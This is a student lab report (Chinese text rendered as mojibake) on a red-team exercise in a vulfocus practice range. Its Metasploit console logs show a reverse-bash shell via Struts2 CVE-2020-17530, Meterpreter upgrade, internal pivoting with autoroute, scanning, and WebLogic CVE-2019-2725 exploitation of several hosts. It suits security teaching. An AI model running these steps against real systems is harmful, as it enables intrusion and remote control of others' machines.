# ç½‘ç»œå®‰å…¨ç»¼åˆå®éªŒæŠ¥å‘Š

## å®éªŒç›®æ ‡

### å‰ç½®

- [x] é€šè¿‡å®¹å™¨éƒ¨ç½²vulfocuså¹³å°æ­å»ºå®éªŒæ‰€éœ€åœºæ™¯

### As Team Red

- æ¼æ´å­˜åœ¨æ€§éªŒè¯

  - [x] struts2 ä»£ç æ‰§è¡Œ ï¼ˆCVE-2020-17530ï¼‰

  - [x] weblogic è¿œç¨‹ä»£ç æ‰§è¡Œ (CVE-2019-2725)

  - [x] ä¸çŸ¥åçš„Nginxå‘½ä»¤æ‰§è¡Œæ¼æ´

- æ¼æ´åˆ©ç”¨

  - [x] struts2 ä»£ç æ‰§è¡Œ ï¼ˆCVE-2020-17530ï¼‰

  - [x] weblogic è¿œç¨‹ä»£ç æ‰§è¡Œ (CVE-2019-2725)

  - [x] ä¸çŸ¥åçš„Nginxå‘½ä»¤æ‰§è¡Œæ¼æ´

### As Team Blue

## å®éªŒç¯å¢ƒ

### ç¯å¢ƒList

- å®¿ä¸»æœºï¼šWindows 11 23H2 22631.2050

- è™šæ‹Ÿæœºå¹³å°

  - Oracle VirtualBox 7.0.8 r156879 as "Attacker"

    - Kali GNU/Linux Rolling x86_64

      - Kernelï¼š6.3.0-kali-amd64

  - WSL 1.3.14.0 as "Victim"

    - Kali GNU/Linux Rolling on Windows 10 x86_64

      - Kernelï¼š5.15.90.3-microsoft-standard-WSL2

### ç¯å¢ƒæè¿°

å› ä¸ºå­˜åœ¨æ”»é˜²çš„èƒŒæ™¯è®¾å®šï¼Œæœ¬æ¬¡å®éªŒä½¿ç”¨åˆ°äº†2å°è™šæ‹Ÿæœºï¼Œåˆ†åˆ«æ˜¯ä½œä¸ºè¢«æ”»å‡»ä¸»æœºçš„WSLå¹³å°Victimä¸»æœºå’Œä½œä¸ºæ”»å‡»è€…ä¸»æœºæ˜¯VirtualBoxå¹³å°Attackerä¸»æœºï¼Œå…¶ä¸­Victimä¸»æœºç”¨äºè¿è¡Œvulfocuså¹³å°çš„åœºæ™¯å®¹å™¨å¹¶è´Ÿè´£æ”»å‡»æµé‡æŠ“å–ï¼ŒAttackerä¸»æœºç”¨äºæ¸—é€æ”»å…¥

## è¯•éªŒè®°å½•

### ç¯å¢ƒæ­å»º

>ç”±äºå®éªŒæ˜¯çº¿ä¸Šè¿›è¡Œï¼Œæ— è®ºçº¢æ–¹è¿˜æ˜¯è“æ–¹éƒ½éœ€è¦è¿›è¡Œè‡ªå·±ä½œä¸ºæˆå‘˜çš„ç¯å¢ƒæ­å»ºï¼Œè¿™é‡Œè®°å½•ä¸ªäººçš„æ­å»ºè¿‡ç¨‹

å·²ç»å…·å¤‡çš„æ¡ä»¶æ˜¯VirtualBoxå’ŒWSLä¸¤ä¸ªå¹³å°éƒ½æœ‰å®‰è£…å¥½çš„Kali Linuxï¼Œå‰è€…æ˜¯ä¹‹å‰CTFç”¨è¿‡çš„ç³»ç»Ÿï¼Œåè€…æ˜¯ç½‘ç»œå®‰å…¨è¯¾ç¨‹å°±æœ‰ä½¿ç”¨çš„Linuxå­ç³»ç»Ÿï¼ŒæŒ‰ç…§è¯¾ç¨‹è§†é¢‘çš„æ¨¡å¼ï¼Œå…¶å®åº”è¯¥æ˜¯ä¸¤å°VirtualBoxè™šæ‹Ÿæœºä¹‹é—´è¿›è¡Œæ“ä½œï¼Œè¿™æ¬¡é€‰æ‹©åˆ›é€ ä¸€ç‚¹å¤šæ ·æ€§å’Œä¸ç¡®å®šæ€§ï¼Œåœ¨ä¸€åŠVirtualBoxä¸€åŠWSLä¸Šè¿›è¡Œç¯å¢ƒæ­å»º

æœ€å¼€å§‹è®¡åˆ’å°†VirtualBoxçš„è™šæ‹ŸæœºKaliä½œä¸ºVictimä¸»æœºï¼Œä½†æ˜¯ç”±äºæƒ³è¦éµå¾ªè¯¾ç¨‹è§†é¢‘ä¸­æè¿°çš„å¥½çš„å·¥ä½œä¹ æƒ¯ï¼Œåœ¨Attackerä¸»æœºä½¿ç”¨Metasploitæ—¶é€šè¿‡msfdbè®°å½•æ“ä½œï¼Œä½†æ˜¯WSLè¿™è¾¹ç”±äºå…¶ä»–åŸå› æ²¡æœ‰è®¾ç½®ä¸ºé€šè¿‡systemdå¼•å¯¼å¯åŠ¨ï¼ˆchrootæ€§è´¨ï¼‰ï¼ŒåŸºäºsystemctlçš„postgresqlåˆå§‹åŒ–æ“ä½œè‡ªç„¶ä¼šå‡ºç°éœ€è¦æŠ˜è…¾çš„æƒ…å†µï¼ˆç”¨ä¸åŒäºsystemdçš„æ–¹å¼å¯åŠ¨æ•°æ®åº“æœåŠ¡æˆ–è€…å°†WSLé€šè¿‡systemdä½œä¸ºPID 1å®Œæ•´å¯åŠ¨ï¼‰ï¼Œäºæ˜¯æœæ–­å°†WSLä½œä¸ºVictimä¸»æœºï¼Œå› ä¸ºæœ‰é¢„å…ˆé…ç½®è¿‡æ‰‹åŠ¨å¯åŠ¨dockerdï¼Œå•çº¯é€šè¿‡å®¹å™¨æ­å»ºvulfocuså¹³å°å’ŒæŠ“åŒ…æµé‡çš„è¯å¹¶ä¸éœ€è¦æŠ˜è…¾

vulfocuså¹³å°çš„æ­å»ºç›´æ¥ä½¿ç”¨äº†[ctf-games](https://github.com/c4pr1c3/ctf-games/tree/master/fofapro/vulfocus)ä¸­æ‰“åŒ…å¥½çš„shellè„šæœ¬ï¼Œgit cloneçš„éƒ¨åˆ†å°±ä¸éœ€è¦ç‰¹åˆ«æ¼”ç¤ºäº†ï¼Œå”¯ä¸€çš„æ“ä½œæ˜¯ç”¨`chmod +x /fofapro/vulfocus/start.sh`ç»™è„šæœ¬æ·»åŠ äº†å¯æ‰§è¡Œæƒé™ï¼Œç„¶åæ‰§è¡Œï¼Œå‰©ä¸‹çš„å°±æ˜¯ç­‰å¾…dockeræ‹‰å–é•œåƒ

å”¯ä¸€å¯ä»¥è¯´ä¸€ä¸‹çš„ç‚¹æ˜¯ï¼Œè¯¾ç¨‹è§†é¢‘åŒ…æ‹¬è¯¾ä»¶ä¸­æè¿°çš„å°†dockeræ¢USTCæºçš„æ“ä½œåº”è¯¥è¢«æ ‡è®°ä¸º**outdated**ï¼Œä»¥ä¸‹æ˜¯å®˜ç½‘çš„æè¿°ï¼š

>ç”±äºè®¿é—®åŸå§‹ç«™ç‚¹çš„ç½‘ç»œå¸¦å®½ç­‰æ¡ä»¶çš„é™åˆ¶ï¼Œå¯¼è‡´ Docker Hub, Google Container Registry (gcr.io) ä¸ Quay Container Registry (quay.io) çš„é•œåƒç¼“å­˜å¤„äºåŸºæœ¬ä¸å¯ç”¨çš„çŠ¶æ€ï¼Œå› æ­¤ç§‘å¤§é•œåƒç«™çš„å„å®¹å™¨é•œåƒæœåŠ¡ä»…é™æ ¡å†…ä½¿ç”¨ã€‚  
>å¯¹äºä»ç§‘å¤§æ ¡å¤–çš„è®¿é—®ï¼š
>
>- Docker Hub å’Œ Google Container Registry ä¼šè¿”å› 403ï¼›  
>
>- Quay ä¼šè¢« 302 é‡å®šå‘è‡³æºç«™ã€‚

ä½œä¸ºé¢‡ä¸ºå‡ºåçš„å¼€æºé•œåƒç«™ï¼Œä¸”ä¸è®ºæ ¼å±€é—®é¢˜ï¼Œä¹Ÿè®¸å¯èƒ½ç¡®å®æ˜¯è¢«è–…ç–¼äº†ï¼Œäºæ˜¯æ–°çš„ğŸçš„é€‰æ‹©å°±å‡ºç°äº†ï¼Œé‚£å°±æ˜¯NJUçš„é•œåƒğŸ˜‚

åªéœ€è¦è¿›è¡Œä¸€ç‚¹ç‚¹ä¿®æ”¹ï¼š

```bash
# ä½¿ç”¨å—äº¬å¤§å­¦ Docker Hub é•œåƒæº
cat <<EOF > /etc/docker/daemon.json
{
  "registry-mirrors": ["https://docker.nju.edu.cn/"]
}
EOF
```

å½“ç„¶å®˜æ–¹ä¹Ÿæœ‰æ–‡æ¡£ï¼Œè¯¦ç»†å†…å®¹å¯ä»¥çœ‹[è¿™é‡Œ](https://doc.nju.edu.cn/books/35f4a/page/docker-hub)

### çº¢æ–¹æ“ä½œ

å‡è®¾è¦çœŸå®ä¸€ç‚¹è€ƒè™‘æ”»é˜²çš„è¯ï¼Œå…¶å®æ•´ä¸ªçº¢æ–¹æ“ä½œéƒ¨åˆ†åœ¨æ¼æ´å­˜åœ¨æ€§æ£€æµ‹è¿™ä¸€ç¯èŠ‚éƒ½æ²¡æœ‰åšå¾ˆå¥½ï¼Œæ­£ç¡®çš„æ€è·¯åº”è¯¥æ˜¯é€šè¿‡æŸç§ä¸æœåŠ¡çš„äº¤äº’è·å–åˆ°ä¿¡æ¯ï¼Œåœ¨ç¡®è®¤POCå¯è¡Œä¹‹åå†æ‰§è¡Œexploitï¼Œå¦åˆ™å°±æ˜¯åœ¨ç™½é€0dayğŸ¤”

è€Œåœ¨æ¥ä¸‹æ¥çš„å†…å®¹å½“ä¸­ï¼Œå°†è®°å½•æœ€â€œä¸æ•¬ä¸šâ€çš„çº¢æ–¹æ“ä½œğŸ˜‚

å³

>â€œæˆåŠŸåˆ©ç”¨=æ¼æ´å­˜åœ¨â€

çš„é€»è¾‘ï¼Œæ— å¥ˆæˆ‘ä»¬è¿™æ˜¯ç™½ç›’æ¸—é€å°±æ˜¯äº†ï¼Œå·²ç„¶åšå¥½äº†æŒ¨éª‚çš„å‡†å¤‡(ã€‚ï¹ã€‚)

#### å¤–å±‚

ä»æ¨¡æ‹Ÿæ˜¾ç¤ºçš„è§’åº¦æ¥è€ƒè™‘ï¼Œæœ€å¤–å±‚çš„ä¸»æœºè´Ÿè´£å¯¹å¤–æä¾›æœåŠ¡ï¼Œäºæ˜¯ç›´æ¥å¾—åˆ°äº†æä¾›æœåŠ¡çš„ç«¯å£å·ï¼Œä¹Ÿå°±æ˜¯vulfocuså¹³å°ä¸Šåœºæ™¯çš„å…¥å£ç«¯å£

æ“ä½œä¸Šï¼Œé€šè¿‡Metasploitå·¥å…·çš„å¹³å°æœç´¢struts2æˆ–è€…~~ä¸æ¼”äº†~~ç›´æ¥æœç´¢CVE-2020-17530ï¼Œå¦‚æœæ˜¯å‰è€…çš„è¯éœ€è¦è¿›è¡Œä¸€ç‚¹è‚‰çœ¼ç­›é€‰ï¼Œè¿™æ¬¡çš„æ¼æ´ç¼–å·è¯´æ˜æ˜¯2020å¹´çš„æ¼æ´ï¼Œäºæ˜¯å¯ç”¨çš„exploitåªæœ‰2020å¹´9æœˆ14æ—¥çš„ï¼š

```metasploit
msf6 > search struts2

Matching Modules
================

   #  Name                                             Disclosure Date  Rank       Check  Description
   -  ----                                             ---------------  ----       -----  -----------
   0  exploit/multi/http/struts_dev_mode               2012-01-06       excellent  Yes    Apache Struts 2 Developer Mode OGNL Execution
   1  exploit/multi/http/struts2_multi_eval_ognl       2020-09-14       excellent  Yes    Apache Struts 2 Forced Multi OGNL Evaluation
   2  exploit/multi/http/struts2_namespace_ognl        2018-08-22       excellent  Yes    Apache Struts 2 Namespace Redirect OGNL Injection
   3  exploit/multi/http/struts2_rest_xstream          2017-09-05       excellent  Yes    Apache Struts 2 REST Plugin XStream RCE
   4  exploit/multi/http/struts2_code_exec_showcase    2017-07-07       excellent  Yes    Apache Struts 2 Struts 1 Plugin Showcase OGNL Code Execution
   5  exploit/multi/http/struts_code_exec_classloader  2014-03-06       manual     No     Apache Struts ClassLoader Manipulation Remote Code Execution
   6  exploit/multi/http/struts2_content_type_ognl     2017-03-07       excellent  Yes    Apache Struts Jakarta Multipart Parser OGNL Injection
   7  exploit/multi/http/struts_code_exec_parameters   2011-10-01       excellent  Yes    Apache Struts ParametersInterceptor Remote Code Execution


Interact with a module by name or index. For example info 7, use 7 or use exploit/multi/http/struts_code_exec_parameters
msf6 > search cve-2020-17530

Matching Modules
================

   #  Name                                        Disclosure Date  Rank       Check  Description
   -  ----                                        ---------------  ----       -----  -----------
   0  exploit/multi/http/struts2_multi_eval_ognl  2020-09-14       excellent  Yes    Apache Struts 2 Forced Multi OGNL Evaluation


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/struts2_multi_eval_ognl

msf6 >
```

ä¹‹åå°±æ˜¯é€‰ç”¨exploitï¼Œç„¶åæ·»åŠ payloadï¼Œè¿™é‡Œé€‰æ‹©å’Œè¯¾ä»¶ä¸­ä¸€æ ·çš„`cmd/unix/reverse_bash`ï¼Œéšåæ˜¯optionsçš„è®¾ç½®é˜¶æ®µï¼Œè®¾ç½®rhostsä¸ºVictimä¸»æœºçš„eth0ç½‘å¡åœ°å€ï¼Œrportåˆ™ä¸ºå¹³å°ä¸Šéšæœºçš„ç«¯å£ï¼ŒåŒæ—¶å°†payloadä¸­çš„lhostè®¾ç½®ä¸ºAttackerä¸»æœºçš„Host-Onlyç½‘å¡ï¼Œä¹‹åå°±å‰©ä¸‹è¾“å…¥runæˆ–è€…exploitæ‰§è¡Œäº†ï¼Œä¸æ·»åŠ `-j`æ— éæ˜¯å°†exploitè¿‡ç¨‹æ”¾åœ¨å‰å°è¿›è¡Œï¼Œä¹Ÿç¡®å®æ²¡æœ‰å¤ªç€æ€¥åˆ°éœ€è¦åœ¨exploitçš„ä¸€ç‚¹æ—¶é—´ä¸­å†è§ç¼æ’é’ˆåšç‚¹ä»€ä¹ˆæ“ä½œ

éšååªéœ€è¦ç­‰å¾…exploitè¿è¡Œå®Œæˆï¼Œpayloadä¸­çš„åå¼¹bashä¼šè‡ªåŠ¨å¼€å¯ï¼Œæ¥ä¸‹æ¥å°±æ˜¯`ls /tmp`æŸ¥çœ‹flagäº†ï¼ˆæ—©æœŸæ‘¸ç´¢è¿‡ç¨‹æˆªå›¾ï¼Œæ¯”è¾ƒå•°å—¦ï¼‰ï¼š

![screenShot](./img/2023-07-15-224012.png)

#### ä¸­å±‚

å½“æ‹¿åˆ°å¤–å±‚ä¸»æœºçš„shellä¹‹åæ˜¯éœ€è¦å¯¹å¤–å±‚ä¸»æœºæ‰€åœ¨å†…éƒ¨ç½‘ç»œè¿›è¡Œæ‰«æï¼Œå°è¯•æ‰¾å‡ºè¿›ä¸€æ­¥å‘æ·±å±‚è¿›å‘çš„è·³æ¿ä¸»æœºï¼Œéœ€è¦åšçš„5ä¸ªæ­¥éª¤å¤§æ¦‚æ˜¯å¦‚ä¸‹å†…å®¹ï¼š

1. å¯¹å·²æ”»å…¥ä¸»æœºæ‰€åœ¨å†…ç½‘ç½‘æ®µä¸­å…¶ä»–ä¸»æœºè¿›è¡Œå­˜æ´»éªŒè¯

2. å¯¹å­˜æ´»çš„å…¶ä»–ä¸»æœºè¿›è¡Œç«¯å£æ‰«æ

3. å¯¹å·²å¼€æ”¾ç«¯å£å·è¿›è¡Œä¿¡æ¯æ”¶é›†ï¼Œå¾—åˆ°å¼€æ”¾çš„æœåŠ¡çš„ä¿¡æ¯

4. ä»å¼€æ”¾çš„æœåŠ¡å…¥æ‰‹è·å–ç‰ˆæœ¬å¯»æ‰¾å¯ç”¨çš„æ¼æ´

5. ç¡®å®šæ¼æ´ï¼Œè£…è½½payloadï¼Œexploit

å¾ˆæ˜¾ç„¶ä¸Šé¢çš„5ä¸ªæ­¥éª¤ä¸­è¿™è¾¹èƒ½å¤Ÿèµ°è¿‡çš„æ˜¯1ï¼Œ2å’Œ5ï¼Œç±»ä¼¼äºå·²çŸ¥äº†æ¼æ´çš„å‰æä¸‹è¿›è¡Œæ“ä½œ

é¦–å…ˆæ˜¯å°†å·²ç»è·å¾—çš„1å·ä¼šè¯å³å¤–å±‚ä¸»æœºshellå‡çº§ä¸ºmeterpreterï¼Œè¯´æ˜¯å‡çº§å¹¶ä¸”æ‰§è¡Œçš„å‘½ä»¤ä¹Ÿæ˜¯`sessions -u 1`ï¼Œå…¶å®æ˜¯é€šè¿‡ä¸Šä¼ åä¸º`post/multi/manage/shell_to_meterpreter`çš„payloadçš„æ–¹å¼å¼€å¯æ›´å¤šåŠŸèƒ½çš„ä¼šè¯ï¼š

```metasploit
msf6 exploit(multi/http/struts2_multi_eval_ognl) > sessions

Active sessions
===============

  Id  Name  Type            Information  Connection
  --  ----  ----            -----------  ----------
  1         shell cmd/unix               192.168.56.107:4444 -> 192.168.56.1:60604 (172.29.108.146)

msf6 exploit(multi/http/struts2_multi_eval_ognl) > sessions -u 1
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.168.56.107:4433
[*] Sending stage (1017704 bytes) to 192.168.56.1
[*] Meterpreter session 2 opened (192.168.56.107:4433 -> 192.168.56.1:60598) at 2023-07-26 05:44:37 -0400
[*] Command stager progress: 100.00% (773/773 bytes)
msf6 exploit(multi/http/struts2_multi_eval_ognl) > sessions

Active sessions
===============

  Id  Name  Type                   Information          Connection
  --  ----  ----                   -----------          ----------
  1         shell cmd/unix                              192.168.56.107:4444 -> 192.168.56.1:60604 (172.29.108.146)
  2         meterpreter x86/linux  root @ 192.171.84.4  192.168.56.107:4433 -> 192.168.56.1:60598 (172.29.108.146)

msf6 exploit(multi/http/struts2_multi_eval_ognl) >
```

æ­¤æ—¶ä½¿ç”¨2å·ä¼šè¯çš„meterperterå°±å¯ä»¥ç›´æ¥æŸ¥çœ‹å¤–å±‚ä¸»æœºçš„ç½‘å¡ä¿¡æ¯äº†ï¼Œäºæ˜¯ä¾¿è·å¾—äº†ä¸€ä¸ªæ–°çš„å†…ç½‘ç½‘æ®µ`192.171.84.0/24`ï¼š

![screenShot](./img/2023-07-26-174733.png)

å½“ç„¶æœ€ä¸»è¦çš„è¿˜æ˜¯éœ€è¦ç”¨meterpreterå®ç°è®©å¤–å±‚çš„ä¸»æœºä½œä¸ºä¸­ä»‹è·¯ç”±ï¼Œå°†ä¸‹ä¸€æ­¥å†…ç½‘æ‰«æçš„åŒ…è½¬å‘è¿‡å»ï¼Œæ­¤æ—¶ä¼šç”¨åˆ°`post/multi/manage/autoroute`æ¨¡å—ï¼Œåªéœ€è¦å°†ä¼šè¯IDå¡«å…¥å³å¯ï¼Œä¹‹åè¿è¡Œä¾¿ä¼šè‡ªåŠ¨æ·»åŠ è·¯ç”±ä¿¡æ¯åˆ°Metasploitçš„è·¯ç”±è¡¨ä¸­ï¼ˆå› ä¸ºé¡ºåˆ©æ‰§è¡Œè¿‡åé‡å¤æ“ä½œä¸ä¼šå†æ¬¡æ·»åŠ è·¯ç”±è¡¨ä¿¡æ¯ï¼Œå¯èƒ½ä¸å®é™…å›æ˜¾ä¸åŒï¼‰ï¼š

```metasploit
msf6 exploit(multi/http/struts2_multi_eval_ognl) > search autoroute

Matching Modules
================

   #  Name                         Disclosure Date  Rank    Check  Description
   -  ----                         ---------------  ----    -----  -----------
   0  post/multi/manage/autoroute                   normal  No     Multi Manage Network Route via Meterpreter Session


Interact with a module by name or index. For example info 0, use 0 or use post/multi/manage/autoroute

msf6 exploit(multi/http/struts2_multi_eval_ognl) > use 0
msf6 post(multi/manage/autoroute) > options

Module options (post/multi/manage/autoroute):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CMD      autoadd          yes       Specify the autoroute command (Accepted: add, autoadd, print, delete, default)
   NETMASK  255.255.255.0    no        Netmask (IPv4 as "255.255.255.0" or CIDR as "/24"
   SESSION  2                yes       The session to run this module on
   SUBNET                    no        Subnet (IPv4, for example, 10.10.10.0)


View the full module info with the info, or info -d command.

msf6 post(multi/manage/autoroute) > run

[!] SESSION may not be compatible with this module:
[!]  * incompatible session platform: linux
[*] Running module against 192.171.84.4
[*] Searching for subnets to autoroute.
[*] Did not find any new subnets to add.
[*] Post module execution completed
msf6 post(multi/manage/autoroute) > route

IPv4 Active Routing Table
=========================

   Subnet             Netmask            Gateway
   ------             -------            -------
   192.171.84.0       255.255.255.0      Session 2

[*] There are currently no IPv6 routes defined.
msf6 post(multi/manage/autoroute) >
```

ä¹‹åçš„é¡ºåºåº”è¯¥ä¸ºå…ˆè¿›è¡Œå­˜æ´»éªŒè¯åè¿›è¡Œç«¯å£æ‰«æï¼Œå¦‚æ­¤å¯ä»¥é€šè¿‡å­˜æ´»æ€§ç­›é™¤æ‰ä¸å¿…è¦çš„IPåœ°å€ï¼Œå¯ä»¥è®©ç«¯å£æ‰«ææ›´å¿«é€Ÿæ›´é«˜æ•ˆï¼Œè¿™é‡Œé€‰æ‹©ä½¿ç”¨æ¨¡å—`post/multi/gather/ping_sweep`ï¼Œå¡«å…¥å¿…è¦çš„optionsä¹‹åå°±å¯ä»¥è¿›è¡Œæ‰«æäº†ï¼š

```metasploit
msf6 exploit(multi/http/struts2_multi_eval_ognl) > search ping_sweep

Matching Modules
================

   #  Name                          Disclosure Date  Rank    Check  Description
   -  ----                          ---------------  ----    -----  -----------
   0  post/multi/gather/ping_sweep                   normal  No     Multi Gather Ping Sweep


Interact with a module by name or index. For example info 0, use 0 or use post/multi/gather/ping_sweep

msf6 exploit(multi/http/struts2_multi_eval_ognl) > use 0
msf6 post(multi/gather/ping_sweep) > options

Module options (post/multi/gather/ping_sweep):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       IP Range to perform ping sweep against.
   SESSION                   yes       The session to run this module on


View the full module info with the info, or info -d command.

msf6 post(multi/gather/ping_sweep) > set rhosts 192.171.84.2-254
rhosts => 192.171.84.2-254
msf6 post(multi/gather/ping_sweep) > set session 2
session => 2
msf6 post(multi/gather/ping_sweep) > run

[*] Performing ping sweep for IP range 192.171.84.2-254
[+]     192.171.84.5 host found
[+]     192.171.84.3 host found
[+]     192.171.84.4 host found
[+]     192.171.84.2 host found
[*] Post module execution completed
msf6 post(multi/gather/ping_sweep) >
```

å…³äºç«¯å£æ‰«æï¼Œç”±äºå·²ç»ç­›é€‰å‡ºæ¥äº†æ‰€æœ‰åœ¨çº¿çš„ä¸»æœºï¼Œè¿™é‡Œå§‘ä¸”å°è¯•äº†åŠÂ·åœ°æ¯¯å¼æ‰«æï¼Œ1-10000ï¼ˆåŸè®¡åˆ’1-65535çš„ï¼Œ16çº¿ç¨‹æ‰«äº†1ä¸ªå°æ—¶äº†æ²¡æ‰«å®Œï¼‰ï¼Œæœ€å¤§åŒ–åŠ¨é™èµ°èµ·äº†ğŸ˜‚é€‰ç”¨çš„æ¨¡å—æ˜¯è¯¾ä»¶åŒæ¬¾çš„`auxiliary/scanner/portscan/tcp`ï¼ŒåŒæ ·æ˜¯å¡«å…¥æ‰€éœ€çš„optionsä¹‹åè¿è¡Œå³å¯

ç­‰å¾…æ‰«æç»“æœä¹‹é™…ï¼Œè¿™é‡Œæˆªå–äº†ä¸€å¼ åœ°æ¯¯å¼ç«¯å£æ‰«ææ—¶å®¿ä¸»æœºä¸Šçœ‹åˆ°çš„ç½‘å¡ä½¿ç”¨æƒ…å†µï¼Œè¿™ç§æµé‡å¦‚æœåœ¨å†…ç½‘ä¸­æœ‰ç›‘æµ‹åˆ°çš„è¯å…¶å®æ˜¯å¯ä»¥è€ƒè™‘ç›´æ¥è¿›è¡ŒäººæœºéªŒè¯æˆ–æ˜¯blockçš„ï¼ˆç¬‘ï¼‰

![screenShot](./img/2023-07-26-183408.png)

ä»…ä»…æ˜¯10000ä¸ªç«¯å£ï¼Œ4å°ä¸»æœºï¼Œç”¨4096çº¿ç¨‹ä¹Ÿç­‰äº†å¾ˆä¹…æ‰ç®—å®Œæ•´è¿è¡Œå‡ºç»“æœï¼š

```metasploit
msf6 auxiliary(scanner/portscan/tcp) > options

Module options (auxiliary/scanner/portscan/tcp):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   CONCURRENCY  10               yes       The number of concurrent ports to check per host
   DELAY        0                yes       The delay between connections, per thread, in milliseconds
   JITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in millisecon
                                           ds.
   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
   RHOSTS       192.171.84.2-5   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/b
                                           asics/using-metasploit.html
   THREADS      1024             yes       The number of concurrent threads (max one per host)
   TIMEOUT      1000             yes       The socket connect timeout in milliseconds


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/portscan/tcp) > set threads 4096
threads => 4096
msf6 auxiliary(scanner/portscan/tcp) > run

[+] 192.171.84.5:         - 192.171.84.5:7001 - TCP OPEN
[+] 192.171.84.2:         - 192.171.84.2:7001 - TCP OPEN
[+] 192.171.84.3:         - 192.171.84.3:7001 - TCP OPEN
[*] 192.171.84.2-5:       - Error: 192.171.84.3: ActiveRecord::ConnectionTimeoutError could not obtain a connection from the pool within 5.000 seconds (waited 5.006 seconds); all pooled connections were in use
[*] 192.171.84.2-5:       - Scanned 1 of 4 hosts (25% complete)
[*] 192.171.84.2-5:       - Scanned 1 of 4 hosts (25% complete)
[+] 192.171.84.4:         - 192.171.84.4:8080 - TCP OPEN
[*] 192.171.84.2-5:       - Scanned 3 of 4 hosts (75% complete)
[*] 192.171.84.2-5:       - Scanned 4 of 4 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/portscan/tcp) >
```

æ¨¡æ‹Ÿå®Œæˆæ­¥éª¤2ä¹‹åï¼Œä¸ºäº†èŠ‚çœæ—¶é—´ï¼Œç›´æ¥é€šè¿‡æŸ¥è¯¢æ¼æ´exploitçš„æ–¹å¼ï¼Œé€šè¿‡Metasploité…åˆä¸ä¹‹å‰ä¸€æ ·çš„payloadï¼Œä¸€æ¬¡æ€§å‘3å°ä¸»æœºå‘é€exploitï¼ˆä¸ºäº†çœäº‹ç›´æ¥`192.171.84.2-5`äº†ï¼Œ`192.171.84.4`å¹¶ä¸æ˜¯ç›®æ ‡ä¸»æœºæ‰€ä»¥é™¤äº†exploitå¤±è´¥ä¹Ÿä¸ä¼šæœ‰å¤ªå¤§é—®é¢˜ï¼‰ï¼š

```metasploit
msf6 auxiliary(scanner/portscan/tcp) > search cve-2019-2725

Matching Modules
================

   #  Name                                                          Disclosure Date  Rank       Check  Description
   -  ----                                                          ---------------  ----       -----  -----------
   0  exploit/multi/misc/weblogic_deserialize_asyncresponseservice  2019-04-23       excellent  Yes    Oracle Weblogic Server Deserialization RCE - AsyncResponseService


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/misc/weblogic_deserialize_asyncresponseservice

msf6 auxiliary(scanner/portscan/tcp) > use 0
[*] Using configured payload cmd/unix/reverse_bash
msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > options

Module options (exploit/multi/misc/weblogic_deserialize_asyncresponseservice):

   Name       Current Setting               Required  Description
   ----       ---------------               --------  -----------
   Proxies                                  no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                                   yes       The target host(s), see https://docs.metasploit.com/docs/using-m
                                                      etasploit/basics/using-metasploit.html
   RPORT      7001                          yes       The target port (TCP)
   SSL        false                         no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /_async/AsyncResponseService  yes       URL to AsyncResponseService
   VHOST                                    no        HTTP server virtual host


Payload options (cmd/unix/reverse_bash):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Unix



View the full module info with the info, or info -d command.

msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > set rhosts 192.171.84.2-3,192.171.84.5
rhosts => 192.171.84.2-3,192.171.84.5
msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > set lhost 192.168.56.107
lhost => 192.168.56.107
msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > run

[-] Msf::OptionValidateError The following options failed to validate: RHOSTS
msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > set rhosts 192.171.84.2-5
rhosts => 192.171.84.2-5
msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > run
[*] Exploiting target 192.171.84.2

[*] Started reverse TCP handler on 192.168.56.107:4444
[*] Generating payload...
[*] Sending payload...
[*] Command shell session 3 opened (192.168.56.107:4444 -> 192.168.56.1:60640) at 2023-07-26 10:53:00 -0400
[*] Session 3 created in the background.
[*] Exploiting target 192.171.84.3
[*] Started reverse TCP handler on 192.168.56.107:4444
[*] Generating payload...
[*] Sending payload...
[*] Command shell session 4 opened (192.168.56.107:4444 -> 192.168.56.1:60630) at 2023-07-26 10:53:07 -0400
[*] Session 4 created in the background.
[*] Exploiting target 192.171.84.4
[*] Started reverse TCP handler on 192.168.56.107:4444
[*] Generating payload...
[*] Sending payload...
[-] Exploit failed: Rex::Post::Meterpreter::RequestError core_channel_open: Operation failed: 1
[*] Exploiting target 192.171.84.5
[*] Started reverse TCP handler on 192.168.56.107:4444
[*] Generating payload...
[*] Sending payload...
[*] Command shell session 5 opened (192.168.56.107:4444 -> 192.168.56.1:60574) at 2023-07-26 10:53:13 -0400
[*] Session 5 created in the background.
msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > sessions

Active sessions
===============

  Id  Name  Type                   Information          Connection
  --  ----  ----                   -----------          ----------
  1         shell cmd/unix                              192.168.56.107:4444 -> 192.168.56.1:60604 (172.29.108.146)
  2         meterpreter x86/linux  root @ 192.171.84.4  192.168.56.107:4433 -> 192.168.56.1:60598 (172.29.108.146)
  3         shell cmd/unix                              192.168.56.107:4444 -> 192.168.56.1:60640 (192.171.84.2)
  4         shell cmd/unix                              192.168.56.107:4444 -> 192.168.56.1:60630 (192.171.84.3)
  5         shell cmd/unix                              192.168.56.107:4444 -> 192.168.56.1:60574 (192.171.84.5)

msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) >
```

